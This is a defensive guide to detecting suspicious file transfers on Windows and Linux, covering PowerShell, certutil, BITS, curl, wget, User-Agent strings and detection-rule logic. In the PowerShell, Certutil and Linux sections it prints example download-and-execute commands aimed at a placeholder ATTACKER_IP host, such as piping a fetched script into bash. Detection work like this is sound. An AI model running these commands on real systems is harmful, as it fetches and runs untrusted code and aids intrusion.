# File Transfer Detection

---

## Executive Summary

File transfer detection focuses on identifying suspicious movement of tools, payloads, scripts, and data across endpoints and networks.

Attackers and testers often use native tools such as PowerShell, `certutil`, BITS, `curl`, `wget`, SMB, FTP, Netcat, and scripting languages to move files. These methods may look like normal administration unless defenders monitor process behavior, command lines, network connections, and unusual User-Agent strings.

## Detection Goals

Defenders should identify file transfer activity that is unusual for the user, host, or environment.

High-value indicators include:

- Downloads from unknown external IP addresses.
- Executable files downloaded into temporary or writable directories.
- PowerShell retrieving content from the internet.
- Use of living-off-the-land binaries for downloads.
- Unexpected SMB, FTP, HTTP, or HTTPS transfers.
- Large outbound uploads from sensitive systems.
- Command-line tools using browser-like User-Agent strings.
- File download followed quickly by execution.

## Common Transfer Methods to Monitor

| Method | Common Use | Detection Focus |
|---|---|---|
| PowerShell | Download scripts or payloads | Web requests, encoded commands, suspicious flags |
| Certutil | Download or decode files | External connections, `urlcache`, file writes |
| BITS | Background downloads | New jobs, external URLs, unusual destinations |
| SMB | Internal file movement | New shares, admin shares, lateral movement |
| FTP | Simple upload/download | Cleartext credentials, unusual destinations |
| Curl / Wget | Linux downloads | Direct IP requests, unusual ports |
| Netcat / Ncat | Raw TCP transfer | Unusual listeners, raw connections |
| SCP | SSH file transfer | Unusual SSH destinations |
| Python HTTP server | Temporary hosting | New listening web server on workstation |
| RDP drive mounting | Manual file movement | Drive redirection and copy events |

## Windows Indicators

Suspicious Windows activity may include:

- `powershell.exe` downloading remote content.
- `certutil.exe` connecting to non-certificate-related domains.
- `bitsadmin.exe` or BITS jobs pulling files from unknown sources.
- `cmd.exe` spawning transfer utilities.
- Office applications spawning shells or download commands.
- Files saved to `C:\Users\Public\`, `%TEMP%`, or user download paths.
- Script interpreters creating executable files.
- RDP sessions using redirected drives.

## PowerShell Download Detection

PowerShell is frequently used for web downloads and fileless execution.

Common suspicious patterns:

```powershell
Invoke-WebRequest
Invoke-RestMethod
DownloadString
DownloadFile
IEX
-WebClient
-EncodedCommand
```

Example suspicious command:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')
```

Useful telemetry:

- PowerShell Script Block Logging
- PowerShell Module Logging
- Process command-line logs
- Network connections from `powershell.exe`
- File creation events after web requests

## Certutil Detection

`certutil.exe` is a legitimate Windows binary often abused for file downloads and decoding.

Suspicious patterns:

```cmd
certutil -urlcache -split -f http://ATTACKER_IP/file.exe file.exe
certutil -decode encoded.txt output.exe
```

Detection ideas:

- Alert when `certutil.exe` connects to external IP addresses.
- Alert on `certutil` writing executable files.
- Alert on `-urlcache`, `-split`, `-f`, or `-decode` usage outside admin workflows.

## BITS Detection

BITS is used by Windows for background transfers, but it can also be abused to download payloads.

Suspicious patterns:

```powershell
Start-BitsTransfer
```

```cmd
bitsadmin /transfer
```

Detection ideas:

- Monitor new BITS jobs.
- Alert on BITS jobs to unknown domains or direct IPs.
- Look for BITS activity followed by process execution.
- Review `HEAD` followed by `GET` requests from BITS User-Agents.

## Suspicious User-Agent Strings

HTTP User-Agent strings can reveal the tool used for the transfer.

| Tool | Example User-Agent |
|---|---|
| PowerShell | `WindowsPowerShell/5.1` |
| Certutil | `Microsoft-CryptoAPI` |
| BITS | `Microsoft BITS` |
| WinHTTP COM object | `WinHttp.WinHttpRequest` |
| Old XMLHTTP COM object | `MSIE 7.0`-style strings |
| Curl | `curl/7.x` |
| Wget | `Wget/1.x` |
| Python Requests | `python-requests` |

Suspicious signs include:

- Command-line User-Agents from normal workstations.
- Old browser User-Agents on modern systems.
- Browser-like User-Agents used by non-browser processes.
- Rare User-Agents contacting unknown destinations.

## Linux Indicators

Suspicious Linux activity may include:

- `curl` or `wget` downloading executable scripts.
- Shell piping remote content directly into `bash`.
- Python starting an HTTP server.
- Netcat or Socat creating listeners.
- SCP transfers from sensitive directories.
- Files downloaded into `/tmp`, `/dev/shm`, or user-writable paths.
- Archive files created before outbound transfer.

Suspicious examples:

```bash
curl http://ATTACKER_IP/script.sh | bash
```

```bash
wget -qO- http://ATTACKER_IP/script.py | python3
```

```bash
python3 -m http.server 8000
```

## Endpoint Indicators

Endpoint logs can show how the transfer happened.

Look for:

- Parent-child process relationships.
- Shells spawning transfer tools.
- Web clients writing executable files.
- Recently created files followed by execution.
- Unusual processes opening network connections.
- Encoded commands.
- Temporary files with executable extensions.
- Archive tools used before upload.

High-risk parent processes include:

- Microsoft Office applications
- Web server processes
- Database services
- Browser processes spawning shells
- Scripting engines
- Remote management tools

## Network Indicators

Network telemetry can reveal suspicious movement even when endpoint visibility is limited.

Look for:

- Direct IP downloads.
- Unusual outbound ports.
- Temporary HTTP servers.
- Large outbound uploads.
- Connections to rare domains.
- Repeated failed download attempts.
- New connections from servers that rarely browse the internet.
- HTTP traffic from command-line User-Agents.
- Internal systems transferring files over SMB unexpectedly.

## File Creation Indicators

Suspicious file writes include:

- Executables in temporary directories.
- Scripts in user profile paths.
- Archives created in sensitive directories.
- Files with double extensions.
- Recently downloaded DLLs.
- Tools written shortly before execution.
- Payloads saved under misleading names.

Common paths to monitor:

```text
C:\Users\Public\
C:\Windows\Temp\
C:\Users\<user>\AppData\Local\Temp\
/tmp
/dev/shm
/var/tmp
/home/<user>/Downloads
```

## Detection Logic Examples

PowerShell downloading from the internet:

```text
process.name = powershell.exe
AND command_line contains any of:
Invoke-WebRequest, Invoke-RestMethod, DownloadString, DownloadFile, WebClient
```

Certutil downloading content:

```text
process.name = certutil.exe
AND command_line contains any of:
-urlcache, -split, -f, http
```

Linux remote script execution:

```text
process.name in (bash, sh)
AND command_line contains any of:
curl, wget
AND command_line contains "|"
```

Python temporary web server:

```text
process.name = python OR process.name = python3
AND command_line contains "http.server"
```

Command-line User-Agent from workstation:

```text
http.user_agent contains any of:
WindowsPowerShell, Microsoft-CryptoAPI, Microsoft BITS, curl, Wget, python-requests
```

## Investigation Workflow

| Phase | Questions |
|---|---|
| Identify | What file was transferred and where did it come from? |
| Validate | Was the transfer expected for this user or system? |
| Scope | Did other hosts download the same file? |
| Timeline | Was the file executed after download? |
| Ownership | Which process and user initiated the transfer? |
| Destination | Was the remote host trusted, known, or suspicious? |
| Impact | Did the transferred file create persistence, credentials access, or lateral movement? |

## Defensive Controls

Useful controls include:

- PowerShell Script Block Logging.
- Command-line process auditing.
- Proxy and firewall logging.
- DNS logging.
- EDR file creation monitoring.
- Egress filtering.
- Application allowlisting.
- Blocking unnecessary outbound protocols.
- Restricting direct internet access from servers.
- Disabling unused tools where practical.
- Alerting on known LOLBAS transfer methods.

## Tuning Considerations

Not all file transfers are malicious.

Common legitimate sources include:

- Software deployment tools.
- Patch management.
- Backup systems.
- Administrator scripts.
- Developer workflows.
- Monitoring agents.
- Cloud sync clients.

Tune detections by considering:

- User role.
- Host role.
- Destination reputation.
- Parent process.
- File type.
- Transfer frequency.
- Time of day.
- Whether execution followed the transfer.

## Defensive Summary

File transfer activity becomes suspicious when the method, destination, file type, parent process, or timing does not match normal behavior.

Strong detections combine endpoint telemetry, network logs, proxy data, DNS records, and file creation events instead of relying on one signal alone.